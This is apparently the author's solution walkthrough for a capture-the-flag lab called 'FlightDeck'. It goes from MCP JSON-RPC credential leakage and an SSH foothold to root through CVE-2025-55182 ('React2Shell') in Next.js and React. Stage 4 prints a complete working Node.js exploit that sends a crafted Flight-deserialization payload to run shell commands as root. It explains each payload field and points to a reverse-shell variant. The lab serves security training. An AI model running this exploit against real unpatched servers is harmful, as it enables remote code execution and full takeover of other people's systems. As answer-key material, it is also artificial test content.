# FlightDeck - Intended Solution (Author Walkthrough)

> Spoilers. This is the author/maintainer reference, not for players.

**Difficulty:** Medium
**Chain:** HTTP recon -> MCP JSON-RPC creds leak -> SSH foothold -> internal enum -> React2Shell (CVE-2025-55182) privesc to root.

Throughout, `TARGET` = `http://localhost:8080` (host port -> container `:80`).
Only container port 80 is exposed. HTTP and SSH share that one port through `sslh`; the Next.js panel (3000) is internal by design.

---

## Stage 0 - Recon

```bash
curl -s -i http://localhost:8080/
```
- Response header `X-Canonical-Host: flightdeck.ai` is the first tell.
- Page source only contains a small hint: `canonical host: flightdeck.ai`.
- `curl -s http://localhost:8080/robots.txt` also hints at the hostname.

Add a local host entry or send the Host header directly:

```bash
curl -s -H 'Host: flightdeck.ai' http://localhost:8080/
```

This vhost is a rabbit hole: a stale static login page. It looks like a normal web/auth challenge and includes SQL-looking old-code bait in `/assets/app.js`, but `/login` always returns `401` and there is no backing database.

Useful enumeration:

```bash
curl -s -H 'Host: flightdeck.ai' http://localhost:8080/robots.txt
curl -s -H 'Host: flightdeck.ai' http://localhost:8080/.well-known/mcp.json | python3 -m json.tool
```

`.well-known/mcp.json` reveals the real service endpoint: `/mcp` over JSON-RPC 2.0 HTTP POST.

**Takeaway for the player:** there is an MCP (Model Context Protocol) service speaking JSON-RPC 2.0 at `/mcp`.

---

## Stage 1 - MCP enumeration (JSON-RPC over HTTP POST)

### 1a. initialize handshake
```bash
curl -s http://localhost:8080/mcp -H 'Content-Type: application/json' -d '{
  "jsonrpc":"2.0","id":1,"method":"initialize",
  "params":{"protocolVersion":"2024-11-05","capabilities":{},
            "clientInfo":{"name":"curl","version":"1.0"}}}' | python3 -m json.tool
```

### 1b. list tools
```bash
curl -s http://localhost:8080/mcp -H 'Content-Type: application/json' -d '{
  "jsonrpc":"2.0","id":2,"method":"tools/list"}' | python3 -m json.tool
```
Tools: `get_server_time`, `list_services`, `read_runbook`, `check_deploy_credentials`, `ping_host`.

### 1c. read the deploy runbook (gets the environment token - the puzzle)
```bash
curl -s http://localhost:8080/mcp -H 'Content-Type: application/json' -d '{
  "jsonrpc":"2.0","id":3,"method":"tools/call",
  "params":{"name":"read_runbook","arguments":{"name":"deploy"}}}' | python3 -m json.tool
```
Reveals `environment="staging"` and `token="staging-xxxxxx"`.

### 1d. pull credentials (the foothold leak)
```bash
curl -s http://localhost:8080/mcp -H 'Content-Type: application/json' -d '{
  "jsonrpc":"2.0","id":4,"method":"tools/call",
  "params":{"name":"check_deploy_credentials",
            "arguments":{"environment":"staging","token":"staging-xxxxxx"}}}' \
  | python3 -m json.tool
```
Returns JSON with `user: svc-mcp` and the generated `password`.

> `ping_host` is a dead end on purpose (returns "unauthorized") to teach that not every tool is open.

---

## Stage 2 - Foothold over SSH

SSH is reachable through the same public port as HTTP. `sslh` fingerprints the protocol and routes SSH to the internal sshd service.

```bash
ssh -p 8080 svc-mcp@localhost     # password from Stage 1d
cat ~/user.txt                    # user flag
cat ~/notes.txt                   # breadcrumb: admin panel on 127.0.0.1:3000 runs as root
ls -la ~/ops                      # security-review notes for the privesc
```

`svc-mcp` has **no sudo**.

---

## Stage 3 - Internal enumeration

```bash
ss -tlnp                                   # see 127.0.0.1:3000 (node) + :80 + :22
ps aux | grep -i next                      # node/next running as ROOT
cat ~/ops/OPS-412.txt                      # clue: RSC + multipart + unsafe Flight deserialization
curl -s http://127.0.0.1:3000/api/test     # {versions: next 15.0.0, react 19.0.0, rsc_enabled:true}
curl -i http://127.0.0.1:3000/api/health   # X-React-Flight + X-RSC-Parser headers
cat /opt/flightdeck-admin/package.json     # confirms pinned vulnerable versions
grep -R "resolved_model\|Flight\|constructor" /opt/flightdeck-admin 2>/dev/null | head
```

`next@15.0.0` + `react@19.0.0` => **vulnerable to CVE-2025-55182 (React2Shell)**.
Process runs as root => RCE = root.

The intended clue trail is:
- `~/notes.txt` says the admin panel runs locally as root and was never patched.
- `~/ops/OPS-412.txt` names App Router, React Server Components, multipart Server Actions, and unsafe Flight deserialization.
- `/api/health` returns `X-React-Flight: enabled` and `X-RSC-Parser: server-actions/multipart`.
- `/api/test` exposes `next@15.0.0`, `react@19.0.0`, `rsc_enabled`, `server_actions`, and `flight_protocol`.
- `~/ops/rsc-payload-notes.txt` gives conceptual payload ingredients without handing over the final exploit.

---

## Stage 4 - Privesc via React2Shell (CVE-2025-55182)

Craft the Flight-protocol deserialization payload and POST it to the Server Action
endpoint (`/`). `child_process.execSync` runs **as root**.

Write the root flag somewhere `svc-mcp` can read, or pop a root shell. The request often hangs after successful code execution, so run it with `timeout`.

Create `/tmp/r2s.js` on the box:

```javascript
const target = "http://127.0.0.1:3000";
const command = "cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt; id > /tmp/rce-id.txt";
const boundary = "----WebKitFormBoundaryReactCVE";
const cmd = command.replace(/"/g, "\\\"");
const jsCode = `(function(){var cp=process.mainModule.require("child_process");cp.execSync("${cmd}",{timeout:5000});})()`;

const part = (name, content) =>
  `--${boundary}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${content}\r\n`;

const body = [
  part("0", "\"$1\""),
  part("1", "{\"status\":\"resolved_model\",\"reason\":0,\"_response\":\"$5\",\"value\":\"{\\\"then\\\":\\\"$4:map\\\",\\\"0\\\":{\\\"then\\\":\\\"$B3\\\"},\\\"length\\\":1}\",\"then\":\"$2:then\"}"),
  part("2", "\"$@3\""),
  part("3", "\"\""),
  part("4", "[]"),
  part("5", JSON.stringify({
    _prefix: `${jsCode}//`,
    _formData: { get: "$4:constructor:constructor" },
    _chunks: "$2:_response:_chunks",
    _bundlerConfig: {}
  }))
].join("") + `--${boundary}--\r\n`;

fetch(target, {
  method: "POST",
  headers: {
    "next-action": "x",
    "Content-Type": `multipart/form-data; boundary=${boundary}`,
  },
  body,
}).catch(() => {});
```

Run it and read the copied flag:

```bash
timeout 3 node /tmp/r2s.js || true
cat /tmp/rce-id.txt       # uid=0(root) ...
cat /tmp/root.txt         # root flag
```

Reverse shell variant: change `command` to a bash reverse shell and start a listener first.

**Payload field meaning (what the player learns):**
| Field | Role |
|---|---|
| `then` / `$2:then` / `$4:map` | builds the thenable chain that triggers unsafe deserialization |
| `status` = `resolved_model` | marks a chunk so the deserializer processes attacker-controlled JSON |
| `_response._prefix` | the JS that gets passed to `Function()` and executed |
| `_response._formData.get` = `$4:constructor:constructor` | reaches the `Function` constructor |

Root achieved -> full compromise.

---

## Difficulty dials
- **Stage 0:** remove the HTML comment / robots note to make discovery harder.
- **Stage 1:** make `check_deploy_credentials` require no token (easier) or add more red-herring tools (harder).
- **Stage 3:** delete `nextapp/app/api/test/route.js` and rebuild so players must read `package.json`.
- **Stage 4:** drop a `payload-skeleton.txt` hint in `svc-mcp`'s home (easier) or leave nothing (harder).

## Maintainership / reset
- `./scripts/flightdeck.sh reset` - full rebuild, **new** creds + flags.
- `./scripts/flightdeck.sh softreset` - recreate container, **same** flags, wipes player changes.
- `./scripts/flightdeck.sh answerkey` - print creds + flags for grading.
